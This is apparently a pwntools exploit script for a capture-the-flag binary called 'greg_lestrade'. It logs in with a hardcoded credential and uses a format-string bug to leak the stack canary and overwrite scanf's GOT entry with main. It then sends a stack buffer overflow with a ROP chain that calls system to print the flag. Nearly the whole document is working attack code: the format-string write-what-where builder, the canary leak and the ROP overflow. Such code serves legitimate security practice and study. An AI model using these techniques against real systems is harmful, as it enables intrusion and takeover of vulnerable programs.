#!/usr/bin/python

from pwn import *
context.arch = 'amd64'

'''
checksec:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
'''

# Create remote connection
#r = remote('146.185.132.36', 12431)
r = process('./greg_lestrade')
credential = "7h15_15_v3ry_53cr37_1_7h1nk"

def readAndSendCredentials(cred):
    '''
    Read in prompt:
    [*] Welcome admin login system! 

    Login with your credential...
    Credential : 
    '''
    print r.recvuntil(": ")
    r.sendline(cred)
    print cred

def readAdmin():
    '''
    Read in prompt:
      0) exit
      1) admin action
    '''
    print r.recvuntil("action")

def doAdminAction(cmd):
    r.sendline("1")
    '''
    Read in prompt:
    [*] Hello, admin 
    Give me your command : 
    '''
    print r.recvuntil(": ")
    r.sendline(cmd)
    return r.recvline(timeout=5) #when we send our payload there is no newline
    
def dofmt(str,size=0):
    readAdmin()
    leak_payload = "a"*254+str
    print "Payload: " + leak_payload
    line = doAdminAction(leak_payload)
    print line
    try:
        res = line[line.rfind('aaaa')+4:]
        return res[:16]
    except:
        return None 

def getUserOffset():
    for i in range(1, 20):
        print i
        if "616161" in dofmt("%{}$llx".format(i)):
            print "Found at {}".format(i)
            return i


#overwrite scanf in got with address of main
def writeWhatWhere(what, where, alreadyPrinted):
    '''
    This has to be done where the addresses are after the format string. Which is
    a little bit tricky
    '''
    print "Write {} to {}".format(hex(what), hex(where))
    global user_offset
    off1 = what&0xFFFFFFFF #write int
    off2 = (what&0x0000FFFF00000000) >> 8 #write short
    off3 = (what&0xFFFF000000000000) >> 12 #write short
    base_off = alreadyPrinted
    off1 = (off1 - (base_off&0xFFFFFFFF))%(0xFFFFFFFF+1)
    off2 = (off2 - ((off1 + base_off) & 0xFFFF)) % 0x10000
    if off2 == 0: #if the offset is 0 we need to wrap around
        off2 = 0x10000
    off3 = (off3 - ((off1 + off2 + base_off) & 0xFFFF)) % 0x10000
    if off3 == 0: #if the offset is 0 we need to wrap around
        off3 = 0x10000
    print "Off1 : {}".format(hex(off1))
    print "Off2 : {}".format(hex(off2))
    print "Off3 : {}".format(hex(off3))
    base_param_offset_size = len(str(alreadyPrinted/8))
    base_format_char_count = base_param_offset_size + len("%{}c%$n".format(off1))
    base_format_char_count += base_param_offset_size + len("%{}c%$hn".format(off2))
    base_format_char_count += base_param_offset_size + len("%{}c%$hn".format(off3))
    padding = 'A'*(8 - ((base_format_char_count + 254) % 8)) #this is to align the addresses on the stack
    param_off = (alreadyPrinted + base_format_char_count + len(padding))/8 + user_offset
    payload = "%{}c%{}$n".format(off1, param_off) + "%{}c%{}$hn".format(off2, param_off+1) + "%{}c%{}$hn".format(off3, param_off+2) + padding + p64(where) + p64(where+4)+p64(where+6)
    print payload
    dofmt(payload)

# Send Credential
readAndSendCredentials(credential)

#Leak canary
user_offset = getUserOffset()
canary_fmt = "%{}$llx".format(user_offset + (0x410-0x8)/8)
canary = int(dofmt(canary_fmt),16)
print "Canary = {}".format(hex(canary))

#Write main to scanf
addr_main = 0x400a2c
b = ELF('greg_lestrade')
loc_scanf = b.got['__isoc99_scanf']
writeWhatWhere(addr_main, loc_scanf, 254)

#do BOF
offset_to_canary = 0x30-8
addr_cat_flag = 0x400c04
payload = 'A'*offset_to_canary
payload += p64(canary)
payload += p64(0xdeadbeef) #rbp
rop = ROP(b)
rop.call('system',[addr_cat_flag])
payload += str(rop)
print payload
r.sendline(payload)

r.interactive()

